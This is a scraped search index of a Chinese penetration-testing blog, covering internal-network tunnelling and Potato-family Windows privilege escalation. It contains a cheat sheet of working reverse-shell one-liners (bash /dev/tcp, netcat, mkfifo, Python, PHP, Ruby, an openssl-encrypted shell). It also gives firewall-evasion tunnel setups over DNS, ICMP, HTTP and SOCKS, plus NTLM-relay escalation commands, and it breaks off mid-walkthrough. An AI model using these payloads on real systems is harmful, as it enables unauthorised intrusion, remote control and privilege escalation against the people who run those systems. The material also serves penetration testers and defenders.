\u003c----\u003e firewall \u003c----\u003e Rhost 和正向代理相反，Lhost 只向 proxy 发送普通的请求，具体让它转到哪里，proxy 自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许 proxy 数据进出的时候可以有效的进行穿透 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:2","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"1.3 转发场景 1.3.1 常见的场景 安全运维：绕过堡垒机或防火墙实现对内网服务器进行远程管理 内网渗透：绕过堡垒机或防火墙实现对内网服务器进行攻击 目标处于网络边界，内外网都可以访问，网络边界主机未安装防火墙，所有端口都对互联网开放，此类业务场景已经极少出现。 目标处于内网，允许特定的应用层协议出网(比如 HTTP、SSH、DNS)等应用层协议(3389、22、445、53、80、443等)。 目标处于内网，不能访问外网，但是可以访问边界主机，防火墙策略限制外部网络直接访问内网的敏感端口(3389、22、445 等)。 常见的转发方式： 反弹端口 反弹 shell socks 代理 1.3.2 防火墙规则 入网 特定的端口映射 80:80 出网 ICMP 允许特定的协议(HTTP、DNS、SSH、RDP) 允许特定端口(先主流端口，再全端口) 1.3.3 连通性检测 在建立隧道前，首先要检测目标机器是否能出网、什么协议可以出网。手动检测较麻烦，所以就有了这个工具，可配合如 wmiexec、psexec 等横向工具进行批量检测，该工具可以在 dnslog 中回显内网 ip 地址和计算机名，可实现内网中的快速定位可出网机器。 工具：https://github.com/uknowsec/SharpNetCheck Usage: SharpNetCheck -dns -host ceye.io SharpNetCheck -http -host/ip ceye.io SharpNetCheck -all -host ceye.io ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:1:3","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"2 反弹 shell ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:0","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"2.1 Bash 2.1.1 Bash TCP bash -i \u003e\u0026 /dev/tcp/ip/port 0\u003e\u00261 bash -i \u003e /dev/tcp/ip/port 0\u003c\u0026 2\u003e\u00261 exec 5\u003c\u003e/dev/tcp/ip/port;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done exec /bin/sh 0\u003c/dev/tcp/ip/port 1\u003e\u00260 2\u003e\u00260 0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/ip/port; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196 2.1.2 Bash UDP Victim: sh -i \u003e\u0026 /dev/udp/10.0.0.1/4242 0\u003e\u00261 Listener: nc -u -lvp 4242 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:1","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"2.2 应用内反弹 shell 2.2.1 netcat ncat ip port -e /bin/bash nc -e /bin/bash ip port rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc ip port \u003e/tmp/f rm -f x; mknod x p \u0026\u0026 nc ip port 0\u003cx | /bin/bash 1\u003ex 2.2.2 python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' # windows only python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"dead:beef:2::125c\",port,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/sh\");' Python 环境下的 Tips 转成交互式 shell：python -c 'import pty;pty.spawn(\"/bin/bash\")' 完全交互式 shell： $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z $ stty raw -echo $ fg $ reset $ export SHELL=bash //$ export TERM=xterm-256color 2.2.3 PHP php -r '$sock=fsockopen(\"ip\",port);exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' php -r '$s=fsockopen(\"ip\",port);$proc=proc_open(\"/bin/sh -i\", array(0=\u003e$s, 1=\u003e$s, 2=\u003e$s),$pipes);' php -r '$s=fsockopen(\"ip\",port);shell_exec(\"/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 2.2.4 Ruby ruby -rsocket -e'f=TCPSocket.open(\"ip\",port).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' # windows only ruby -rsocket -e 'c=TCPSocket.new(\"ip\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:2","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"2.3 openssl 流量加密 # VPS 生成 SSL 证书的公私钥对 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # 在 VPS 监听反弹 shell openssl s_server -quiet -key key.pem -cert cert.pem -port 4433 # 在目标上用 openssl 加密反弹 shell 的流量(linux) mkfifo /tmp/s; /bin/sh -i \u003c /tmp/s 2\u003e\u00261 | openssl s_client -quiet -connect IP:port \u003e /tmp/s; rm /tmp/s # windows openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2] # 以上命令会从 [ip]:[port1] 获取命令发送给 cmd.exe执行，然后把结果返回到 [ip]:[port2] # 因此在本机需要启动两个 s_server # 从 port1 发送命令到 cmd openssl s_server -quiet -key key.pem -cert cert.pem -port [port1] # 从 port2 获取发送给 port1 的命令执行结果 openssl s_server -quiet -key key.pem -cert cert.pem -port [port2] ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:3","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"2.4 All in One 以下是几个自动生成反弹 shell 命令的网站： https://mrxn.net/reverse_shell.php https://ares-x.com/tools/reverse-shell/ 一个在线编码的网站，防止因特殊字符被过滤，也可以用在 java.lang.Runtime.exec() 的 payload 中： http://www.jackson-t.ca/runtime-exec-payloads.html ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:2:4","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"3 应用层隧道 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:0","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"3.1 HTTP 隧道 3.1.1 reGeorg 建议使用 nosocket 版 工具地址：https://github.com/sensepost/reGeorg 使用方法： 上传 tunnel 文件 服务端运行：python reGeorgSocksProxy.py -p 8080 -u http://ip:port/tunnel/tunnel.jsp 3.1.2 Neo-reGorg 工具地址：https://github.com/L-codes/Neo-reGeorg Neo-reGeorg 是一个重构了 reGeorg 的项目，目的是： 提高 tunnel 连接安全性 提高可用性，避免特征检测 提高传输内容保密性 应对更多的网络环境场景 使用方法： 设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器：python3 neoreg.py generate -k password 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理：python3 neoreg.py -k password -u http://xx/tunnel.php 注意 注意，如果你的工具，如 nmap 不支持 socks5 代理设置，请使用 proxychains 等 3.1.3 其它 Tunna # -u 远程代理脚本地址 # -l 表示本地监听的端口 # -r 远程映射端口 # -v 输出详细数据 # -a 代理远程连接的主机地址 python proxy.py -u http://ip/conn.aspx -l 1080 -v python proxy.py -u http://ip/conn.aspx -l 5555 -r 8080 -s -v -n abptts pystinger … ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:1","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"3.2 SSH 隧道 参考：https://3nd.xyz/AD-Pentest/AD-Pentest-Hidden-Tunnel/ 3.2.1 本地端口转发 在本地主机上开启端口流量转发功能 例如：在入侵者主机上执行（VPS 上执行主动连接） ssh -L 8866:192.168.10.3:23 -fN 192.168.10.2 3.2.2 远程端口转发 在远程主机上开启端口流量转发功能 例如：在堡垒机上执行（边界主机上执行回连） ssh -R 8866:192.168.10.3:23 -fN 192.168.10.1 3.2.3 动态转发 - Socket 在本地主机上开启流量动态转发功能，并配置代理 例如：在入侵者主机上执行 ssh -D 1100 -fN 192.168.10.2 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:2","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"3.3 DNS 隧道 工具 DNScat2 编译好的各种版本：https://downloads.skullsecurity.org/dnscat2/ 3.3.1 配置解析记录 DNS 解析记录中添加一条 A 记录，名称为 ns1 值为 VPS IP 地址 再添加一条 NS 记录，名称为任意一个子域名，指向地址为 ns1.yourdomain.com 3.3.2 安装 dnscat2 服务端 apt-get install gem apt-get install ruby-dev apt-get install libpq-dev apt-get install ruby-bundler apt-get install git git clone https://github.com/iagox86/dnscat2 bundle install 3.3.3 启动服务端 ruby ./dnscat2.rb dnscat.yuming.com -e open -c mima --no-cache 3.3.4 启动客户端 # 测试能否通信 dnscat-client.exe -ping dnscat.yuming.com # 连接 dnscat-client.exe --dns domain=dnscat.yuming.com -secret mima ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:3:3","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"4 传输层 SOCKS4 支持 telnet、FTP、HTTP 等 TCP 协议 SOCKS5 支持 TCP 与 UDP，并支持安全认证方案 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:0","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"4.1 FRP frp 采用 Golang 编写，支持跨平台，仅需下载对应平台的二进制文件即可执行。工具地址：https://github.com/fatedier/frp 编写配置文件，先通过 ./frps -c ./frps.ini 启动服务端，再通过 ./frpc -c ./frpc.ini 启动客户端。 服务端部署在我们具有公网 IP 的服务器上，客户端放在我们拿到权限的跳板服务器上，双端都需要对配置文件进行配置。 4.1.1 服务端 [common] # frp 服务端端口 bind_port = 7000 # 仪表盘端口 dashboard_port = 8888 # frp服务端密码 token = 123456 # 仪表盘默认账号密码 dashboard_user = admin dashboard_pwd = admin 启动 FRP：frps -c frps.ini 4.1.2 客户端 [common] server_addr = VPS IP server_port = 7000 # 与 vps 保持一致 token = 123456 [ssh] type = tcp local_ip = 127.0.0.1 local_port = 22 remote_port = 7000 use_encryption = true use_compression = true ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:1","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"4.2 iox iox 是一个端口转发 \u0026 内网代理工具，功能类似于lcx/ew，但是比它们更好。 工具地址：https://github.com/EddieIvan01/iox 4.2.1 端口转发 # 端口转发 - 从本地 8888 转到 9999 ./iox fwd -l 8888 -l 9999 # 端口转发 - 从本地 8888，把流量转发到 1.1.1.1:9999 ./iox fwd -l 8888 -r 1.1.1.1:9999 # 连接 1.1.1.1:8888 和 1.1.1.1:9999, 在两个连接间转发 ./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999 4.2.2 代理 # 在本地 0.0.0.0:1080 启动 Socks5 服务 - 正向代理 ./iox proxy -l 1080 # 反向代理 # 在被控机开启 Socks5 服务，将服务转发到公网 VPS ./iox proxy -r 1.1.1.1:9999 # 在 VPS 上转发 0.0.0.0:9999 到 0.0.0.0:1080 # 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连 ./iox proxy -l 9999 -l 1080 // 注意，这两个端口是有顺序的 # 接着连接内网主机 # socks5://1.1.1.1:1080 proxychains rdesktop 192.168.0.100:3389 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:2","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"4.3 sSocks sSocks 是一个 socks 代理工具套装，可用来开启 socks 代理服务，支持 socks5 验证，支持 IPV6 和 UDP，并提供反向 socks 代理服务，即将远程计算机作为 socks 代理服务端，反弹回本地，极大方便内网的渗透测试。 工具地址：http://sourceforge.net/projects/ssocks/ 正向代理 ./ssocksd --bind 192.168.172.131 --port 1080 反向代理 # 攻击者机器监听 6020 端口转发到 6010 ./rcsocks -l 6020 -p 6010 -vv # 受害者反向连接代理主机 6010 端口 ./rssocks -s 攻击者IP:6010 -vv ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:4:3","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"5 网络层 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:5:0","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["内网渗透"],"content":"5.1 ICMP Tunnel 工具名称：ICMPSH 5.1.1 服务端 服务端首先需要关闭 ICMP 回显：sysctl -w net.ipv4.icmp_echo_ignore_all=1 安装服务端： apt-get install python-impacket python icmpsh_m.py 本机IP 目标机器公网IP 5.1.2 客户端 icmpsh.exe -t 目标IP -d 500 -b 30 -s 128 ","date":"2020-08-15","objectID":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/:5:1","tags":["域安全","内网渗透"],"title":"内网隧道穿透","uri":"/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/"},{"categories":["渗透测试","提权"],"content":"Potato 家族提权分析","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"Potato 家族提权分析 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:0:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"1 前言 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"1.1 windows 服务的登录用户 Local System - NT AUTHORITY\\SYSTEM Network Service - NT AUTHORITY\\Network Service Local Service - NT AUTHORITY\\Local Service 服务账户在 windows 权限模型中本身就拥有很高的权限，在实际渗透过程中，拿到 webshell 下，用户权限是 IIS 或者 apache，或通过 SQLi 执行 xp_cmdshell，此时手里的服务账户在进行操作时是低权限账户，而使用该提权手法可以直接获取 SYSTEM 权限。 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:1","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"1.2 前提 利用 Potato 提权（除开 Hot Potato）的是前提是拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限，以下用户拥有 SeImpersonatePrivilege 权限（而只有更高权限的账户比如 SYSTEM 才有 SeAssignPrimaryTokenPrivilege 权限）： 本地管理员账户(不包括管理员组普通账户)和本地服务账户 由 SCM 启动的服务 PS：本机测试时即使在本地策略中授予管理员组普通用户 SeImpersonatePrivilege 特权，在 cmd.exe 中 whoami /priv 也不显示该特权，且无法利用；而 SeAssignPrimaryTokenPrivilege 特权则可以正常授予普通用户 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:2","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"1.3 Windows Token windows token 是描述安全上下文的对象，用户登陆后系统就会生成 token，创建新进程或新线程时这个 token 会不断拷贝。 当用户具有 SeImpersonatePrivilege 特权，则可以调用 CreateProcessWithTokenW 以某个 Token 的权限启动新进程 当用户具有 SeAssignPrimaryTokenPrivilege 特权，则可以调用 CreateProcessAsUserW 以 Token 权限启动新进程 具体可以参考「Windows Access Token 攻击」文章。 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:1:3","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"2 Hot Potato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"2.1 简介 2016 年 1 月， Dominic White 发表了一篇文章，发布了一种基于 NTLM 反射的权限提升攻击方式，命名为 Hot Potato。可以从主机的最低用户权限提升至系统最高的 NT\\AUTHORITY SYSTEM 权限。 Hot Potato 利用著名的 NTLM Relay 攻击(HTTP -\u003e SMB)和 NBNS 欺骗攻击，获取 Windows 系统的最高权限 SYSTEM。可以从主机的最低用户权限提升至系统最高的 NT\\AUTHORITY SYSTEM 权限。 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:1","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"2.2 NBNS 2.2.1 概念 NBNS (Net BIOS Name Service)是 Windows 系统中广泛被使用的 UDP 广播服务，即命名查询服务。该服务使用 UDP 协议实现，可以通过发送局域网内广播来实现本地名称解析。 类似于 TCP/IP 协议中的 DNS，它负责查找目标机器相应的 IP 地址，并赋予一个 NetBIOS 名称。微软 WINS 服务就是采用 NBNS协议。 2.2.2 NBNS 欺骗 系统进行一个名字查询的逻辑如下： 首先查询本地的 hosts 文件 DNS Lookup 查询(本地 DNS cache，再向 DNS 服务器请求) NBNS 查询 NBNS 的逻辑是向本地所有主机广播一条消息，谁是 xxx，如果谁响应了该广播消息，谁就是 xxx 在内网渗透测试时，攻击者往往会监听 NBNS 广播消息，并且会应答自己是 xxx，这就是NBNS 欺骗；ARP欺骗是 MAC 层的欺骗方式 NBNS 包有 1 个 2 字节的 TXID 字段，必须进行请求\\响应的匹配。因为是提权漏洞，所以攻击之前没有权限可以监听流量。可以通过 1-65535 之间进行泛洪猜测。 如果网络中有 DNS 记录，此时就不会用到 NBNS 协议；可以通过 UDP 端口耗尽的攻击技术，让所有 DNS 查询失败，从而必须使用 NBNS 协议 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:2","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"2.3 WPAD 代理 Windows 系统里，IE 浏览器会自动检测 IE 代理配置信息，方式是访问，http://wpad/wpad.dat\u0026#8221 WPAD 是不一定存在于网络中，因为即使有 DNS 服务器，也没有必要解析 WPAD，除非网络想通过配置脚本自动配置网络中的代理信息，这种情况很方便。 因此在 hosts、DNS 查询都不能获取 WPAD 的情况下，系统必然使用 NBNS 进行名字查询，此时可以通过 NBNS 欺骗，告知自己就是 WPAD 可以构造 HTTP 服务器，响应 HTTP http://wpad/wpad.dat\u0026#8221 查询 通过在 127.0.0.1 上构建 HTTP，将查询 WPAD 的流量全部引导至本地 127.0.0.1；即使低权限用户发出的对 WPAD 的 NBNS 欺骗，高权限进程也会受影响，认为 WPAD 就是欺骗后的结果。包括本地管理员进程和 SYSTEM 进程。 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:3","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"2.4 HTTP -\u003e SMB NTLM Relay NTLM 认证对于中间人攻击的防御能力不强，此前针对 NTLM 的重放攻击聚焦于 SMB -\u003e SMB 协议，反射攻击访问者的主机，获取远程执行权限; 微软通过补丁封堵了 SMB -\u003e SMB 协议的重放反射攻击，但是 HTTP -\u003e SMB 这种跨协议的攻击仍然有效 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:4","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"2.5 攻击流程 Hot Potato 攻击就是结合了这几点，实现权限提升： NBNS 欺骗 构造本地 HTTP，响应 WPAD HTTP -\u003e SMB NTLM Relay 等待高权限进程的访问，即激活更新服务(低权限可激活) https://github.com/Kevin-Robertson/Tater Import-Module .\\Tater.ps1 Invoke-Tater -Command \"command to execute\" 工具地址：https://github.com/foxglovesec/Potato Win7 利用 - Windows Defender 更新机制 Potato.exe -ip -cmd [cmd to run] -disable_exhaust true Win Server 2008 利用 - Windows Update 机制 Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true -spoof_host WPAD.EMC.LOCAL Win Server 2012 R2 - 自动更新机制，该机会每天下载证书信任列表(CTL) Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true 防护： SMB 签名 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:2:5","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"3 Rotten Potato \u0026 JuicyPotato ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:0","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"3.1 原理 这两种不同于初始的 Potato，它是通过 DCOM CALL 来使服务向攻击者监听的端口发起连接并进行 NTLM 认证 Rotten Potato 和 Juicy Potato 几乎是同样的原理，后者在前者的基础上完善。 需要理解的几个知识： 使用 DCOM 时，如果以服务的方式远程连接，那么权限为 System，例如 BITS 服务 使用 DCOM 可以通过 TCP 连接到本机的一个端口，发起 NTLM 认证，该认证可以被重放 LocalService 用户默认具有 SeImpersonate 和 SeAssignPrimaryToken 权限 开启 SeImpersonate 权限后，能够在调用 CreateProcessWithToken 时，传入新的 Token 创建新的进程 开启 SeAssignPrimaryToken 权限后，能够在调用 CreateProcessAsUser 时，传入新的 Token 创建新的进程 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:1","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"3.2 实现流程 加载 COM，发出请求，权限为 System 在指定 ip 和端口的位置尝试加载一个 COM 对象 RottenPotatoNG 使用的 COM 对象为 BITS，CLSID 为 {4991d34b-80a1-4291-83b6-3328366b9097} 可供选择的 COM 对象不唯一，Juicy Potato 提供了多个，详细列表可参考如下地址： https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md 回应步骤 1 的请求，发起 NTLM 认证 正常情况下，由于权限不足，当前权限不是 System，无法认证成功 针对本地端口，同样发起 NTLM 认证，权限为当前用户 由于权限为当前用户，所以 NTLM 认证能够成功完成 信息 RottenPotatoNG 使用的 135 端口 Juicy Potato 支持指定任意本地端口，但是 RPC 一般默认为135端口，很少被修改 分别拦截两个 NTLM 认证的数据包，替换数据，通过 NTLM 重放使得步骤 1(权限为 System)的 NTLM 认证通过，获得 System 权限的 Token 重放时需要注意 NTLM 认证的 NTLM Server Challenge 不同，需要修正 利用 System 权限的 Token 创建新进程 如果开启 SeImpersonate 权限，调用 CreateProcessWithToken，传入 System 权限的 Token，创建的进程为 System 权限 或者 如果开启 SeAssignPrimaryToken 权限，调用 CreateProcessAsUser，传入 System 权限的 Token，创建的进程为 System 权限 ","date":"2020-08-15","objectID":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/:3:2","tags":["渗透测试","提权"],"title":"Potato 家族提权分析","uri":"/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"},{"categories":["渗透测试","提权"],"content":"3.2 实战 工具地址：https://github.com/ohpe/juicy-potato 3.2.1 initial access 一个 iis apppool\\defaultapppool 权限的 webshell。 3.2.2 根据操作系统选择可用的 CLSID 参考列表 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md 例如测试系统 Server2012，选择 CLSID 为{8BC3F05E-D86B-11D0-A075-00C04FB68820} 使用批处理调用 juicypotato.exe 逐个验证： 地址如下： 